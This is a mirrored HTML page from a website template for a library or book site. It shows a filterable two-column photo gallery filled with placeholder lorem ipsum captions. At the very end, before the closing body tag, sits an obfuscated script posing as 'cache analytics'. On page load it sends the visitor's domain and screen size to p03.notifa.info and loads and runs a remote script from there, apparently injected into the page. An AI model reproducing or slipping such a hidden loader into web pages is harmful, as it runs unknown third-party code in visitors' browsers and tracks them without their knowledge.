...
<!-- Mirrored from kodeforest.net/html/books/library/gallery-2col.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:18:12 GMT -->
<head>
<meta charset="utf-8">
...
<div class="wrapper kode-header-class-3">
    ...
    <div class="kode-content padding-tb-50">
        <div class="container">
            <div class="kode-portfolio-page">
                <ul id="filterable-item-filter-1">
                    <li><a data-value="all">All</a></li>
                    <li><a data-value="1">Photography</a></li>
                    <li><a data-value="2">Design</a></li>
                    <li><a data-value="4">Development</a></li>
                    <li><a data-value="5">Branding</a></li>
                    <li><a data-value="6">Mobile App</a></li>
                    <li><a data-value="7">Mock Ups</a></li>
                </ul>
                <div id="filterable-item-holder-1" class="row">
                    <div class="filterable-item all 1 2 col-md-6 col-sm-6">
                    ...
                    <div class="filterable-item all 2 3 col-md-6 col-sm-6">
                        <div class="lib-gallery">
                    ...
                    <div class="filterable-item all 3 4 col-md-6 col-sm-6">
                        <div class="lib-gallery">
                    ...
                    <div class="filterable-item all 4 1 col-md-6 col-sm-6">
                        <div class="lib-gallery">
                    ...
                    <div class="filterable-item all 5 6 3 col-md-6 col-sm-6">
                        <div class="lib-gallery">
                    ...
                    <div class="filterable-item all 6 3 2 col-md-6 col-sm-6">
                        <div class="lib-gallery">
                    ...
                    <div class="filterable-item all 3 7 6 5 4 col-md-6 col-sm-6">
                        <div class="lib-gallery">
                            <a href="#"><img src="images/gallery8.png" alt=""></a>
                            <div class="caption">
                                <h4>Gallery title</h4>
                                <p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore</p>
                            </div>
                    ...
                    <div class="filterable-item all 4 1 6 7 col-md-6 col-sm-6">
                        <div class="lib-gallery">
                            <a href="#"><img src="images/gallery7.png" alt=""></a>
                            <div class="caption">
                                <h4>Gallery title</h4>
                                <p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore</p>
                            </div>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdy8hzAW7EupUjEKy%2b42eLcgnaPScD87QLoi0hp3SE%2fmbnhvm4lzjni%2f%2bZqxUrvgaaZnLsjYh8h6uBcFo1BXRtd2p3QBi2DBnmOO563Rd2ZsSaThyUgI7C4BGZRfWx4J851ICEpnA8rMOgLt3tULLSNwVrDw6lWacCp9RdsFBPM4wqr9UlkELMCG7R4Hat96BnNQD1zIh06pNpusyU4XHkLFOI9qrY6YpSXMXnDDczKniF7kkhbRcnJ2ZcWnVHdF21o2mPrA9SkY%2bfamKvGjyePxqcZykFIVfO3VHBw8oQYpgflHMCu0QA%2bVxKRcKncRKfTnx0sJPZkUzuO1OF8SQrTRp8bjZsMj7OCnjPM6s%2bmW%2fO73WE7SoS8ad5qmjeRj8HVULXE6wz0KpGVDRUtIgtumbZNCAox5VJcxDhHU%2fhypjL3fHsm7CXBhoRSVXNd%2bDD%2f8S8ok%2fX1%2fzLPo9R2wWiGpju%2fUa%2fVF6kjTqqFL2u1BpVWIZX4znhdA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from kodeforest.net/html/books/library/gallery-2col.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:18:33 GMT -->
</html>